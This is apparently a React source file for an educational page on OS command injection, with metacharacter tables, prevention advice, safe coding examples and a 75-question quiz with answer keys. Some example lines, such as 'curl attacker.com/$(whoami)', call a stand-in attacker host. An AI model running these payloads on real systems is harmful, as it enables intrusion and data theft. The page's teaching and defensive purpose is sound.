import React, { useState, useEffect } from "react";
import LearnPageLayout from "../components/LearnPageLayout";
import QuizSection, { QuizQuestion } from "../components/QuizSection";
import {
  Box,
  Container,
  Typography,
  Paper,
  Chip,
  Button,
  Grid,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  alpha,
  useTheme,
  Fab,
  Drawer,
  IconButton,
  Divider,
  LinearProgress,
  Tooltip,
  useMediaQuery,
} from "@mui/material";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import TerminalIcon from "@mui/icons-material/Terminal";
import WarningIcon from "@mui/icons-material/Warning";
import CodeIcon from "@mui/icons-material/Code";
import SecurityIcon from "@mui/icons-material/Security";
import BugReportIcon from "@mui/icons-material/BugReport";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import TipsAndUpdatesIcon from "@mui/icons-material/TipsAndUpdates";
import QuizIcon from "@mui/icons-material/Quiz";
import ListAltIcon from "@mui/icons-material/ListAlt";
import CloseIcon from "@mui/icons-material/Close";
import KeyboardArrowUpIcon from "@mui/icons-material/KeyboardArrowUp";
import SchoolIcon from "@mui/icons-material/School";
import CategoryIcon from "@mui/icons-material/Category";
import BuildIcon from "@mui/icons-material/Build";
import HistoryIcon from "@mui/icons-material/History";
import { Link, useNavigate } from "react-router-dom";

interface InjectionType {
  title: string;
  description: string;
  example: string;
  color: string;
}

const injectionTypes: InjectionType[] = [
  { title: "Direct Injection", description: "User input directly concatenated into command", example: "ping -c 4 {user_input}", color: "#ef4444" },
  { title: "Blind Injection", description: "No output returned, infer via timing or out-of-band", example: "sleep 10 || curl attacker.com", color: "#f59e0b" },
  { title: "Out-of-Band", description: "Exfiltrate data via DNS, HTTP to external server", example: "curl attacker.com/$(whoami)", color: "#8b5cf6" },
];

const shellMetacharacters = [
  { char: ";", use: "Command separator" },
  { char: "&&", use: "Execute if previous succeeds" },
  { char: "||", use: "Execute if previous fails" },
  { char: "|", use: "Pipe output to next command" },
  { char: "`cmd`", use: "Command substitution (backticks)" },
  { char: "$(cmd)", use: "Command substitution (modern)" },
  { char: ">", use: "Redirect output to file" },
  { char: "\\n", use: "Newline (URL: %0a)" },
];

const commonVulnPatterns = [
  "system(), exec(), shell_exec() with user input",
  "subprocess.call(shell=True) in Python",
  "Runtime.exec() in Java",
  "os.system() / os.popen() in Python",
  "backticks or system() in Ruby/Perl",
  "eval() with user-controlled strings",
];

const commonEntryPoints = [
  { title: "Network utilities", examples: "ping, traceroute, nslookup, curl" },
  { title: "File and backup tooling", examples: "tar, zip, rsync, mysqldump" },
  { title: "Media processing", examples: "ffmpeg, convert, exiftool" },
  { title: "DevOps automation", examples: "git, kubectl, docker, terraform" },
  { title: "Search and reporting", examples: "grep, find, awk, log processors" },
  { title: "Document rendering", examples: "wkhtmltopdf, pandoc, latex" },
];

const detectionSignals = [
  "Shell error messages or unexpected stderr output",
  "Time delays after injected sleeps or long pings",
  "Outbound DNS/HTTP callbacks to unusual domains",
  "Unexpected files created in temp or working dirs",
  "Child processes or command-line args containing user input",
];

const hardeningChecklist = [
  "Use exec/spawn with argument arrays and no shell parsing",
  "Pass -- before user input to prevent option injection",
  "Lock down PATH and environment variables",
  "Allowlist command names and arguments explicitly",
  "Run with minimal privileges and restricted filesystem access",
  "Log command execution with sanitized arguments",
];

const preventionMethods = [
  "Avoid shell commands entirely-use APIs/libraries",
  "Use parameterized commands (subprocess with list args)",
  "Strict input validation (whitelist allowed chars)",
  "Escape shell metacharacters properly",
  "Run with least privilege (drop root)",
  "Use sandboxing/containers for command execution",
];

const attackFlow = [
  "Identify where user input enters command construction.",
  "Confirm whether a shell is invoked (system, exec, shell=True).",
  "Test with harmless payloads to verify execution safely.",
  "Check for option injection even when shell parsing is avoided.",
  "Document evidence and propose a safe remediation plan.",
];

const safeTestPayloads = [
  { label: "Echo marker", payload: "echo VRA_TEST", note: "Look for the marker in output or logs." },
  { label: "Identity check", payload: "whoami", note: "Confirms the execution context." },
  { label: "Timing probe", payload: "sleep 5", note: "Use for blind detection via delay." },
  { label: "Hostname", payload: "hostname", note: "Safe indicator of command execution." },
];

const safeCommandExamples = [
  { title: "Node.js (spawn)", snippet: "spawn(\"ping\", [\"-c\", \"1\", target], { shell: false });", detail: "Pass args as arrays and avoid shell parsing." },
  { title: "Python (subprocess)", snippet: "subprocess.run([\"ping\", \"-c\", \"1\", target], check=True)", detail: "Use list args with shell=False." },
  { title: "Go (exec.Command)", snippet: "exec.Command(\"ping\", \"-c\", \"1\", target).Run()", detail: "Use explicit arguments, no concatenation." },
  { title: "Java (ProcessBuilder)", snippet: "new ProcessBuilder(\"ping\", \"-c\", \"1\", target).start();", detail: "Avoid command strings built from input." },
];

const optionInjectionTips = [
  "Reject arguments that start with '-' unless explicitly allowed.",
  "Use '--' before user input to stop option parsing when supported.",
  "Allowlist flags and values separately instead of free-form strings.",
  "Normalize whitespace and trim unexpected separators.",
];

const validationPatterns = [
  { label: "IPv4 allowlist", example: "^[0-9.]+$ plus range check per octet" },
  { label: "Hostname allowlist", example: "^[a-zA-Z0-9.-]+$ and length limits" },
  { label: "Numeric only", example: "^[0-9]+$ for counts or sizes" },
  { label: "Filename allowlist", example: "^[a-zA-Z0-9._-]+$ and block path separators" },
];

const loggingFields = [
  "Raw input and normalized input",
  "Resolved command array and working directory",
  "Exit code, duration, and timeouts",
  "User context and request source",
  "Blocked attempts and validation failures",
];

const commonMistakes = [
  "Relying on escaping alone instead of removing the shell",
  "Allowing newlines or separators that break validation",
  "Validating one field but concatenating a different one",
  "Trusting client-side validation or hidden fields",
  "Using allowlists for commands but not for arguments",
];

const defenseLayers = [
  "Avoid shell invocation and use argument arrays",
  "Strict allowlists and length limits on input",
  "Least privilege service accounts",
  "Sandboxing or container isolation",
  "Timeouts, rate limits, and alerting",
];

const ACCENT_COLOR = "#ef4444";
const QUIZ_QUESTION_COUNT = 10;

const quizQuestions: QuizQuestion[] = [
  {
    id: 1,
    topic: "Fundamentals",
    question: "Command injection happens when:",
    options: [
      "User input reaches a system shell without safe handling",
      "A database query fails",
      "A cookie is missing",
      "A page returns 404",
    ],
    correctAnswer: 0,
    explanation: "Unsafe user input passed to a shell can execute OS commands.",
  },
  {
    id: 2,
    topic: "Fundamentals",
    question: "Command injection is severe because it can:",
    options: [
      "Execute arbitrary OS commands",
      "Only change CSS styles",
      "Only read browser cookies",
      "Only slow a page load",
    ],
    correctAnswer: 0,
    explanation: "Attackers can run OS commands on the server.",
  },
  {
    id: 3,
    topic: "Injection Types",
    question: "Direct injection means:",
    options: [
      "User input is concatenated into a command",
      "No output is returned to the user",
      "Requests go to an external server",
      "Only timing is observed",
    ],
    correctAnswer: 0,
    explanation: "Direct injection is immediate command execution via concatenation.",
  },
  {
    id: 4,
    topic: "Injection Types",
    question: "Blind injection is detected by:",
    options: [
      "Timing or side effects",
      "Visible command output",
      "A new login prompt",
      "Only HTTP status codes",
    ],
    correctAnswer: 0,
    explanation: "Blind injection requires timing or out-of-band confirmation.",
  },
  {
    id: 5,
    topic: "Injection Types",
    question: "Out-of-band injection uses:",
    options: [
      "External DNS or HTTP callbacks",
      "Only local files",
      "Only database errors",
      "Only UI changes",
    ],
    correctAnswer: 0,
    explanation: "OOB confirms execution via external callbacks.",
  },
  {
    id: 6,
    topic: "Metacharacters",
    question: "The semicolon (;) is used to:",
    options: ["Separate commands", "Escape quotes", "Start comments", "Encode URLs"],
    correctAnswer: 0,
    explanation: "Semicolon chains commands in many shells.",
  },
  {
    id: 7,
    topic: "Metacharacters",
    question: "The && operator means:",
    options: ["Run next command if previous succeeds", "Run both commands always", "Run next if previous fails", "Start a subshell"],
    correctAnswer: 0,
    explanation: "&& only runs the next command on success.",
  },
  {
    id: 8,
    topic: "Metacharacters",
    question: "The || operator means:",
    options: ["Run next command if previous fails", "Run next if previous succeeds", "Pipe output", "Redirect output"],
    correctAnswer: 0,
    explanation: "|| executes the next command on failure.",
  },
  {
    id: 9,
    topic: "Metacharacters",
    question: "The pipe (|) is used to:",
    options: ["Send output to another command", "End a command", "Escape input", "Create a file"],
    correctAnswer: 0,
    explanation: "Pipes pass output between commands.",
  },
  {
    id: 10,
    topic: "Metacharacters",
    question: "The $(cmd) syntax is:",
    options: ["Command substitution", "A comment", "A file glob", "A variable name"],
    correctAnswer: 0,
    explanation: "$(cmd) executes and substitutes command output.",
  },
  {
    id: 11,
    topic: "Metacharacters",
    question: "Backticks (`cmd`) are used for:",
    options: ["Command substitution", "Redirecting output", "Boolean logic", "Escaping spaces"],
    correctAnswer: 0,
    explanation: "Backticks execute a command and substitute its output.",
  },
  {
    id: 12,
    topic: "Metacharacters",
    question: "The > character is used to:",
    options: ["Redirect output to a file", "Pipe output", "Start a loop", "Escape input"],
    correctAnswer: 0,
    explanation: "Redirects can overwrite or create files.",
  },
  {
    id: 13,
    topic: "Metacharacters",
    question: "A newline injection can be represented as:",
    options: ["%0a", "%2f", "%3f", "%26"],
    correctAnswer: 0,
    explanation: "%0a is a URL-encoded newline.",
  },
  {
    id: 14,
    topic: "Detection",
    question: "A long response delay after 'sleep' indicates:",
    options: ["Blind command injection", "TLS errors", "XSS", "Caching"],
    correctAnswer: 0,
    explanation: "Timing delays are a common blind indicator.",
  },
  {
    id: 15,
    topic: "Detection",
    question: "Unexpected outbound DNS/HTTP traffic suggests:",
    options: ["Out-of-band command injection", "CORS issues", "CSRF", "Session fixation"],
    correctAnswer: 0,
    explanation: "External callbacks often confirm execution.",
  },
  {
    id: 16,
    topic: "Entry Points",
    question: "A common command injection entry point is:",
    options: ["Network utilities like ping", "Static HTML", "CSS files", "Image tags"],
    correctAnswer: 0,
    explanation: "Ping, traceroute, and similar tools are common entry points.",
  },
  {
    id: 17,
    topic: "Entry Points",
    question: "Backup utilities like tar or zip are risky because:",
    options: ["They often accept user input in commands", "They use only GUI", "They run in browsers", "They block all input"],
    correctAnswer: 0,
    explanation: "User-supplied paths or names can be injected.",
  },
  {
    id: 18,
    topic: "Entry Points",
    question: "Media processing tools are risky because:",
    options: ["They frequently wrap OS commands", "They only parse JSON", "They always sanitize input", "They never use shells"],
    correctAnswer: 0,
    explanation: "Many media pipelines shell out to tools like ffmpeg.",
  },
  {
    id: 19,
    topic: "Entry Points",
    question: "DevOps automation tools can be risky when:",
    options: ["Commands include user-supplied input", "They run locally only", "They are read-only", "They use HTTPS"],
    correctAnswer: 0,
    explanation: "Automation often runs privileged commands.",
  },
  {
    id: 20,
    topic: "Entry Points",
    question: "Search or reporting features may be vulnerable because:",
    options: ["They build shell commands from input", "They only read cookies", "They never parse input", "They only render HTML"],
    correctAnswer: 0,
    explanation: "Shell-based filters are common in reporting.",
  },
  {
    id: 21,
    topic: "Vulnerable Patterns",
    question: "Using system() with user input is:",
    options: ["High risk", "Safe by default", "Only a logging issue", "A performance issue"],
    correctAnswer: 0,
    explanation: "system() executes a shell with user input.",
  },
  {
    id: 22,
    topic: "Vulnerable Patterns",
    question: "subprocess.call with shell=True is risky because:",
    options: ["Shell metacharacters are interpreted", "It blocks all input", "It forces HTTPS", "It disables environment variables"],
    correctAnswer: 0,
    explanation: "shell=True enables injection via metacharacters.",
  },
  {
    id: 23,
    topic: "Vulnerable Patterns",
    question: "Runtime.exec in Java is risky when:",
    options: ["Arguments are concatenated from user input", "It uses arrays", "It is not used", "It uses only constants"],
    correctAnswer: 0,
    explanation: "Concatenation can introduce injection.",
  },
  {
    id: 24,
    topic: "Vulnerable Patterns",
    question: "os.system and os.popen are risky because:",
    options: ["They invoke a shell", "They compile code", "They only log output", "They enforce allowlists"],
    correctAnswer: 0,
    explanation: "Shell invocation allows metacharacter injection.",
  },
  {
    id: 25,
    topic: "Vulnerable Patterns",
    question: "Using eval with user input can lead to:",
    options: ["Command execution", "Better validation", "Faster rendering", "Safe parsing"],
    correctAnswer: 0,
    explanation: "eval executes code, enabling injection.",
  },
  {
    id: 26,
    topic: "Vulnerable Patterns",
    question: "Building a command string by concatenation is:",
    options: ["A common source of injection", "Always safe", "Only a UI issue", "Required for security"],
    correctAnswer: 0,
    explanation: "Concatenation mixes user input with commands.",
  },
  {
    id: 27,
    topic: "Prevention",
    question: "Best practice is to:",
    options: ["Avoid shell commands and use libraries", "Always use shell=True", "Allow any characters", "Disable logging"],
    correctAnswer: 0,
    explanation: "Libraries avoid shell interpretation.",
  },
  {
    id: 28,
    topic: "Prevention",
    question: "Using argument arrays with exec/spawn:",
    options: ["Avoids shell parsing", "Enables metacharacters", "Disables validation", "Increases injection risk"],
    correctAnswer: 0,
    explanation: "Array arguments bypass shell parsing.",
  },
  {
    id: 29,
    topic: "Prevention",
    question: "A command allowlist is:",
    options: ["An explicit list of permitted commands", "A list of blocked IPs", "A list of cookies", "A firewall rule"],
    correctAnswer: 0,
    explanation: "Allowlists define safe commands and args.",
  },
  {
    id: 30,
    topic: "Prevention",
    question: "Input validation should be:",
    options: ["Allowlist-based", "Only client-side", "Optional", "Disabled for admins"],
    correctAnswer: 0,
    explanation: "Allowlists reduce unexpected input.",
  },
  {
    id: 31,
    topic: "Prevention",
    question: "Escaping metacharacters is:",
    options: ["Helpful but error-prone", "A complete fix", "Unnecessary", "Only for logging"],
    correctAnswer: 0,
    explanation: "Escaping helps but is not a complete fix.",
  },
  {
    id: 32,
    topic: "Hardening",
    question: "Least privilege reduces risk because:",
    options: ["Compromised commands have limited access", "It disables logging", "It increases privileges", "It hides errors"],
    correctAnswer: 0,
    explanation: "Lower privileges limit impact.",
  },
  {
    id: 33,
    topic: "Hardening",
    question: "Sandboxing helps by:",
    options: ["Restricting filesystem and process access", "Disabling HTTPS", "Expanding PATH", "Skipping validation"],
    correctAnswer: 0,
    explanation: "Sandboxing constrains command execution.",
  },
  {
    id: 34,
    topic: "Hardening",
    question: "Passing -- before user input prevents:",
    options: ["Option injection", "SQL injection", "XSS", "CSRF"],
    correctAnswer: 0,
    explanation: "-- stops option parsing in many tools.",
  },
  {
    id: 35,
    topic: "Hardening",
    question: "Locking down PATH is important because:",
    options: ["Attackers can replace binaries", "It breaks DNS", "It disables TLS", "It creates cookies"],
    correctAnswer: 0,
    explanation: "A poisoned PATH can run malicious binaries.",
  },
  {
    id: 36,
    topic: "Hardening",
    question: "Logging command execution should:",
    options: ["Sanitize sensitive arguments", "Store secrets in plaintext", "Disable monitoring", "Hide errors"],
    correctAnswer: 0,
    explanation: "Logs should avoid exposing secrets.",
  },
  {
    id: 37,
    topic: "Testing",
    question: "A safe proof of command execution is:",
    options: ["whoami or hostname", "rm -rf /", "exfiltrate data", "install a backdoor"],
    correctAnswer: 0,
    explanation: "Use harmless commands for PoC.",
  },
  {
    id: 38,
    topic: "Testing",
    question: "A common blind payload is:",
    options: ["; sleep 5", "SELECT *", "<script>", "../etc/passwd"],
    correctAnswer: 0,
    explanation: "Timing payloads reveal blind execution.",
  },
  {
    id: 39,
    topic: "Testing",
    question: "An OOB test often uses:",
    options: ["curl to a controlled domain", "local file read", "TLS downgrade", "cookie theft"],
    correctAnswer: 0,
    explanation: "External callbacks confirm execution.",
  },
  {
    id: 40,
    topic: "Metacharacters",
    question: "Command substitution allows:",
    options: ["Embedding command output into another command", "URL encoding", "Database joins", "JWT signing"],
    correctAnswer: 0,
    explanation: "Substitution runs a command and inserts output.",
  },
  {
    id: 41,
    topic: "Validation",
    question: "Output encoding prevents:",
    options: ["XSS, not command injection", "Command injection", "SSRF", "SQL injection"],
    correctAnswer: 0,
    explanation: "Encoding output does not stop shell execution.",
  },
  {
    id: 42,
    topic: "Shell",
    question: "The safest approach is to:",
    options: ["Avoid invoking a shell", "Always invoke a shell", "Use eval", "Trust user input"],
    correctAnswer: 0,
    explanation: "Shells interpret metacharacters and expand input.",
  },
  {
    id: 43,
    topic: "Option Injection",
    question: "Option injection occurs when:",
    options: ["User input is treated as command flags", "A file is uploaded", "Cookies are missing", "Errors are hidden"],
    correctAnswer: 0,
    explanation: "Flags can change command behavior.",
  },
  {
    id: 44,
    topic: "Environment",
    question: "Environment variables are risky when:",
    options: ["Commands rely on untrusted PATH or env", "They are read-only", "They are constant", "They are empty"],
    correctAnswer: 0,
    explanation: "Untrusted env values can alter execution.",
  },
  {
    id: 45,
    topic: "Detection",
    question: "Unexpected stderr output can indicate:",
    options: ["Command injection attempts", "Normal caching", "TLS success", "Static content"],
    correctAnswer: 0,
    explanation: "Shell errors can show injection attempts.",
  },
  {
    id: 46,
    topic: "Detection",
    question: "Child processes with user input in args are:",
    options: ["A strong injection signal", "Always normal", "Only UI issues", "Only a network issue"],
    correctAnswer: 0,
    explanation: "User input in child process args can indicate injection.",
  },
  {
    id: 47,
    topic: "Detection",
    question: "Unexpected temp files can indicate:",
    options: ["Command injection side effects", "Better performance", "TLS negotiation", "Normal caching"],
    correctAnswer: 0,
    explanation: "Injected commands often create temp files.",
  },
  {
    id: 48,
    topic: "Detection",
    question: "New outbound connections to strange domains suggest:",
    options: ["OOB injection testing", "Password reset", "Local backup", "Static asset fetch"],
    correctAnswer: 0,
    explanation: "OOB callbacks indicate command execution.",
  },
  {
    id: 49,
    topic: "Metacharacters",
    question: "Which character is commonly used for redirection?",
    options: [">", "?", "@", "="],
    correctAnswer: 0,
    explanation: "> redirects output to a file.",
  },
  {
    id: 50,
    topic: "Metacharacters",
    question: "Which sequence is most likely to chain commands?",
    options: ["&&", "::", "**", "%%"],
    correctAnswer: 0,
    explanation: "&& chains commands on success.",
  },
  {
    id: 51,
    topic: "Metacharacters",
    question: "Which sequence can execute a command inline?",
    options: ["$(cmd)", "{cmd}", "[cmd]", "<cmd>"],
    correctAnswer: 0,
    explanation: "$(cmd) runs the command and substitutes output.",
  },
  {
    id: 52,
    topic: "Metacharacters",
    question: "Which character typically separates piped commands?",
    options: ["|", ":", ",", "~"],
    correctAnswer: 0,
    explanation: "The pipe character separates commands.",
  },
  {
    id: 53,
    topic: "Shell",
    question: "Using shell=False in Python subprocess:",
    options: ["Disables shell parsing", "Enables metacharacters", "Runs in browser", "Ignores arguments"],
    correctAnswer: 0,
    explanation: "shell=False avoids shell interpretation.",
  },
  {
    id: 54,
    topic: "Validation",
    question: "A good allowlist for a ping target is:",
    options: ["Digits and dots only", "Any character", "Only quotes", "Only semicolons"],
    correctAnswer: 0,
    explanation: "Allowing only digits and dots reduces injection risk.",
  },
  {
    id: 55,
    topic: "Fundamentals",
    question: "Command injection differs from SQL injection because it targets:",
    options: ["The OS shell", "Only the database", "Only the browser", "Only CSS"],
    correctAnswer: 0,
    explanation: "Command injection executes OS commands.",
  },
  {
    id: 56,
    topic: "Code Review",
    question: "In code review, risky calls include:",
    options: ["system, exec, shell_exec", "JSON.parse", "Math.round", "Date.now"],
    correctAnswer: 0,
    explanation: "Shell execution functions need careful handling.",
  },
  {
    id: 57,
    topic: "Impact",
    question: "A successful command injection can lead to:",
    options: ["Remote code execution", "Only UI glitches", "Only 404 errors", "Only cache misses"],
    correctAnswer: 0,
    explanation: "Attackers can run OS commands on the host.",
  },
  {
    id: 58,
    topic: "Hardening",
    question: "Why use timeouts on command execution?",
    options: ["Prevent long-running abuse", "Increase output size", "Improve CSS", "Disable logging"],
    correctAnswer: 0,
    explanation: "Timeouts limit resource abuse.",
  },
  {
    id: 59,
    topic: "Hardening",
    question: "Running as root is risky because:",
    options: ["Injected commands have full privileges", "It blocks injection", "It reduces impact", "It disables shells"],
    correctAnswer: 0,
    explanation: "Root access magnifies impact.",
  },
  {
    id: 60,
    topic: "Prevention",
    question: "Which is the strongest mitigation?",
    options: ["Remove shell usage and use safe APIs", "Escape a few characters", "Block one endpoint", "Hide error messages"],
    correctAnswer: 0,
    explanation: "Avoiding the shell removes the root cause.",
  },
  {
    id: 61,
    topic: "Testing",
    question: "Why avoid destructive payloads in testing?",
    options: ["They can damage systems or data", "They prove nothing", "They are required", "They are faster"],
    correctAnswer: 0,
    explanation: "Safe PoCs demonstrate impact without harm.",
  },
  {
    id: 62,
    topic: "Detection",
    question: "A spike in child processes may indicate:",
    options: ["Command injection abuse", "Normal caching", "DNS resolution", "Static assets"],
    correctAnswer: 0,
    explanation: "Unexpected process spawning is suspicious.",
  },
  {
    id: 63,
    topic: "Metacharacters",
    question: "Which is used for command substitution in many shells?",
    options: ["`cmd`", "%%", "::", "##"],
    correctAnswer: 0,
    explanation: "Backticks perform command substitution.",
  },
  {
    id: 64,
    topic: "Prevention",
    question: "Why is client-side validation insufficient?",
    options: ["It can be bypassed", "It blocks all input", "It runs on the server", "It enforces allowlists"],
    correctAnswer: 0,
    explanation: "Attackers can bypass client checks.",
  },
  {
    id: 65,
    topic: "Shell",
    question: "Using a shell expands:",
    options: ["Metacharacters and variables", "Only numbers", "Only static strings", "Only HTTPS"],
    correctAnswer: 0,
    explanation: "Shells expand variables and metacharacters.",
  },
  {
    id: 66,
    topic: "Prevention",
    question: "Which is safer in Node.js?",
    options: ["spawn with args array", "exec with string", "eval user input", "shell=true"],
    correctAnswer: 0,
    explanation: "spawn with args avoids shell parsing.",
  },
  {
    id: 67,
    topic: "Input",
    question: "Allowlisting IPs for ping should:",
    options: ["Reject characters like ; and &", "Allow any characters", "Allow backticks", "Allow pipes"],
    correctAnswer: 0,
    explanation: "Disallow metacharacters to reduce injection risk.",
  },
  {
    id: 68,
    topic: "Detection",
    question: "Command injection can be confirmed by:",
    options: ["External callback to a controlled host", "Changing CSS", "Clearing cache", "Refreshing the page"],
    correctAnswer: 0,
    explanation: "Callbacks confirm server-side execution.",
  },
  {
    id: 69,
    topic: "Hardening",
    question: "Why restrict filesystem access?",
    options: ["Limit impact of injected commands", "Improve UI", "Increase throughput", "Enable cookies"],
    correctAnswer: 0,
    explanation: "Restricted access reduces damage.",
  },
  {
    id: 70,
    topic: "Hardening",
    question: "Using containers for command execution helps by:",
    options: ["Isolating the execution environment", "Disabling TLS", "Allowing any input", "Removing auth"],
    correctAnswer: 0,
    explanation: "Isolation limits lateral impact.",
  },
  {
    id: 71,
    topic: "Detection",
    question: "Which signal is most suspicious?",
    options: ["Command output containing injected input", "Static CSS load", "Image cache hit", "Normal 200 response"],
    correctAnswer: 0,
    explanation: "Injected input in output suggests command execution.",
  },
  {
    id: 72,
    topic: "Testing",
    question: "Why use time-based payloads?",
    options: ["They reveal execution without output", "They fix bugs", "They speed up responses", "They improve logging"],
    correctAnswer: 0,
    explanation: "Timing proves execution in blind cases.",
  },
  {
    id: 73,
    topic: "Prevention",
    question: "Which is NOT a safe mitigation?",
    options: ["Relying on blacklists alone", "Argument arrays", "Allowlists", "Least privilege"],
    correctAnswer: 0,
    explanation: "Blacklists are easy to bypass.",
  },
  {
    id: 74,
    topic: "Fundamentals",
    question: "Option injection can still occur when:",
    options: ["Command is fixed but user input is an argument", "No user input exists", "Only constants are used", "Shell is not used"],
    correctAnswer: 0,
    explanation: "User input as arguments can become flags.",
  },
  {
    id: 75,
    topic: "Prevention",
    question: "The most reliable fix for command injection is to:",
    options: ["Remove shell usage and avoid command construction", "Add more logging", "Hide error messages", "Use GET instead of POST"],
    correctAnswer: 0,
    explanation: "Eliminate shell usage to remove the root cause.",
  },
];


export default function CommandInjectionPage() {
  const navigate = useNavigate();
  const theme = useTheme();
  const [navDrawerOpen, setNavDrawerOpen] = useState(false);
  const [activeSection, setActiveSection] = useState('intro');
  const isLgUp = useMediaQuery(theme.breakpoints.up('lg'));

  const sectionNavItems = [
    { id: 'intro', label: 'Introduction', icon: <SchoolIcon fontSize="small" /> },
    { id: 'overview', label: 'What is Command Injection', icon: <TerminalIcon fontSize="small" /> },
    { id: 'injection-types', label: 'Injection Types', icon: <CategoryIcon fontSize="small" /> },
    { id: 'entry-points', label: 'Entry Points', icon: <TerminalIcon fontSize="small" /> },
    { id: 'metacharacters', label: 'Shell Metacharacters', icon: <CodeIcon fontSize="small" /> },
    { id: 'testing-flow', label: 'Safe Testing Flow', icon: <SecurityIcon fontSize="small" /> },
    { id: 'test-payloads', label: 'Test Payloads', icon: <TerminalIcon fontSize="small" /> },
    { id: 'validation', label: 'Input Validation', icon: <CheckCircleIcon fontSize="small" /> },
    { id: 'detection', label: 'Detection Signals', icon: <WarningIcon fontSize="small" /> },
    { id: 'logging', label: 'Logging & Monitoring', icon: <HistoryIcon fontSize="small" /> },
    { id: 'option-injection', label: 'Option Injection', icon: <SecurityIcon fontSize="small" /> },
    { id: 'vuln-prevention', label: 'Vulnerable Patterns & Prevention', icon: <BugReportIcon fontSize="small" /> },
    { id: 'mistakes', label: 'Common Mistakes', icon: <WarningIcon fontSize="small" /> },
    { id: 'safe-commands', label: 'Safe Command Construction', icon: <BuildIcon fontSize="small" /> },
    { id: 'hardening', label: 'Hardening Checklist', icon: <SecurityIcon fontSize="small" /> },
    { id: 'defense', label: 'Defense in Depth', icon: <SecurityIcon fontSize="small" /> },
    { id: 'quiz-section', label: 'Knowledge Quiz', icon: <QuizIcon fontSize="small" /> },
  ];

  const scrollToSection = (sectionId: string) => {
    const element = document.getElementById(sectionId);
    if (element) {
      const offset = 80;
      const elementPosition = element.getBoundingClientRect().top + window.pageYOffset;
      window.scrollTo({ top: elementPosition - offset, behavior: 'smooth' });
      setActiveSection(sectionId);
      setNavDrawerOpen(false);
    }
  };

  useEffect(() => {
    const handleScroll = () => {
      const sections = sectionNavItems.map(item => item.id);
      for (let i = sections.length - 1; i >= 0; i--) {
        const element = document.getElementById(sections[i]);
        if (element) {
          const rect = element.getBoundingClientRect();
          if (rect.top <= 120) {
            setActiveSection(sections[i]);
            break;
          }
        }
      }
    };
    window.addEventListener('scroll', handleScroll);
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  const progressPercent = Math.round(
    ((sectionNavItems.findIndex(s => s.id === activeSection) + 1) / sectionNavItems.length) * 100
  );

  const sidebarNav = (
    <Box
      sx={{
        position: 'sticky',
        top: 90,
        maxHeight: 'calc(100vh - 100px)',
        overflowY: 'auto',
        pr: 2,
        display: { xs: 'none', lg: 'block' },
        width: 260,
        flexShrink: 0,
      }}
    >
      <Paper
        elevation={0}
        sx={{
          p: 2,
          borderRadius: 3,
          border: `1px solid ${alpha(theme.palette.divider, 0.1)}`,
          bgcolor: alpha(theme.palette.background.paper, 0.6),
        }}
      >
        <Typography variant="overline" sx={{ color: 'text.secondary', fontWeight: 700, mb: 1, display: 'block' }}>
          On This Page
        </Typography>
        <LinearProgress
          variant="determinate"
          value={progressPercent}
          sx={{
            mb: 2,
            height: 4,
            borderRadius: 2,
            bgcolor: alpha(ACCENT_COLOR, 0.1),
            '& .MuiLinearProgress-bar': { bgcolor: ACCENT_COLOR },
          }}
        />
        <List dense disablePadding>
          {sectionNavItems.map((item) => (
            <ListItem
              key={item.id}
              disablePadding
              sx={{ mb: 0.5 }}
            >
              <Box
                onClick={() => scrollToSection(item.id)}
                sx={{
                  display: 'flex',
                  alignItems: 'center',
                  gap: 1,
                  py: 0.75,
                  px: 1.5,
                  borderRadius: 1.5,
                  cursor: 'pointer',
                  width: '100%',
                  transition: 'all 0.2s',
                  bgcolor: activeSection === item.id ? alpha(ACCENT_COLOR, 0.1) : 'transparent',
                  borderLeft: activeSection === item.id ? `3px solid ${ACCENT_COLOR}` : '3px solid transparent',
                  '&:hover': {
                    bgcolor: alpha(ACCENT_COLOR, 0.05),
                  },
                }}
              >
                <Box sx={{ color: activeSection === item.id ? ACCENT_COLOR : 'text.secondary' }}>
                  {item.icon}
                </Box>
                <Typography
                  variant="body2"
                  sx={{
                    fontWeight: activeSection === item.id ? 600 : 400,
                    color: activeSection === item.id ? ACCENT_COLOR : 'text.secondary',
                    fontSize: '0.8rem',
                  }}
                >
                  {item.label}
                </Typography>
              </Box>
            </ListItem>
          ))}
        </List>
      </Paper>
    </Box>
  );

  const pageContext = `Command Injection & OS Command Execution Guide - Covers direct, blind, and out-of-band command injection techniques. Lists shell metacharacters, entry points, detection signals, safe testing workflow, validation patterns, logging fields, vulnerable code patterns, and prevention methods.`;

  return (
    <LearnPageLayout pageTitle="Command Injection" pageContext={pageContext}>
      {/* Floating Navigation Buttons - Mobile/Tablet */}
      {!isLgUp && (
        <>
          <Tooltip title="Navigate sections">
            <Fab
              size="medium"
              onClick={() => setNavDrawerOpen(true)}
              sx={{
                position: 'fixed',
                bottom: 80,
                left: 16,
                zIndex: 1000,
                bgcolor: ACCENT_COLOR,
                color: '#fff',
                '&:hover': { bgcolor: alpha(ACCENT_COLOR, 0.9) },
              }}
            >
              <ListAltIcon />
            </Fab>
          </Tooltip>
          <Tooltip title="Scroll to top">
            <Fab
              size="small"
              onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })}
              sx={{
                position: 'fixed',
                bottom: 24,
                right: 16,
                zIndex: 1000,
                bgcolor: alpha(theme.palette.background.paper, 0.9),
                border: `1px solid ${alpha(theme.palette.divider, 0.2)}`,
                '&:hover': { bgcolor: theme.palette.background.paper },
              }}
            >
              <KeyboardArrowUpIcon />
            </Fab>
          </Tooltip>
        </>
      )}

      {/* Mobile Navigation Drawer */}
      <Drawer
        anchor="left"
        open={navDrawerOpen}
        onClose={() => setNavDrawerOpen(false)}
        PaperProps={{
          sx: {
            width: 280,
            bgcolor: theme.palette.background.default,
            p: 2,
          },
        }}
      >
        <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2 }}>
          <Typography variant="h6" sx={{ fontWeight: 700, color: ACCENT_COLOR }}>
            Navigation
          </Typography>
          <IconButton onClick={() => setNavDrawerOpen(false)} size="small">
            <CloseIcon />
          </IconButton>
        </Box>
        <LinearProgress
          variant="determinate"
          value={progressPercent}
          sx={{
            mb: 2,
            height: 4,
            borderRadius: 2,
            bgcolor: alpha(ACCENT_COLOR, 0.1),
            '& .MuiLinearProgress-bar': { bgcolor: ACCENT_COLOR },
          }}
        />
